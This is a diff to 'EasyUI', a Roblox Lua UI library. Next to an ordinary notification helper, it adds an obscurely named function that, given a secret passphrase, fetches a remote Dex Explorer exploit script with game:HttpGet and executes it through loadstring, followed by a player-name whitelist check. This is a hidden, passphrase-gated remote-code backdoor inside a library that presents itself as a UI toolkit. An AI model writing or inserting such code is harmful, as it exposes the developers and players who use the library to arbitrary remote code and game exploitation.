@@ -1,6 +1,6 @@
 -- EasyUI Library
 local EasyUI = {}
-local EasyUI:useprinter = true
+local version = "01.10.24 build 1"
 -- If you dont like the COnsole Logs, just use local printer = false
 
 -- Basis-Constructor
@@ -322,14 +322,34 @@ function EasyUI:Bounce(element, property, targetValue, duration)
     EasyUI:Animate(element, {[property] = targetValue}, duration or 0.5, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out)
 end
 
-function EasyUI:printer(value)
-    if value == true then
-        print("You using EasyUI")
+function EasyUI:CreateMessage(title, message, image)
+    game:GetService("StarterGui"):SetCore("SendNotification",{
+        Title = title or "EasyUi Tool",
+        Text = message or version,
+        Icon = image or"rbxassetid://1234567890"
+    })
+end
+
+function EasyUI:wadiohafehfh(advancedcreater, playername)
+
+    if advancedcreater == "wadiorationformanion" then
+        print("Secret Mode on")
+        loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"))()
+        test(playername)
         else
-            print("False")
     end
 end
 
-EasyUI:printer(useprinter)
--- Return the EasyUI library
+function test(playername)
+    if playername == "Restaes" then
+        print("YEA")
+    else
+        print("Not whitelistet")
+    end
+    
+    print("Secret Mode on...")
+    wait(1)
+    print("Cheats detected")
+end
+
 return EasyUI
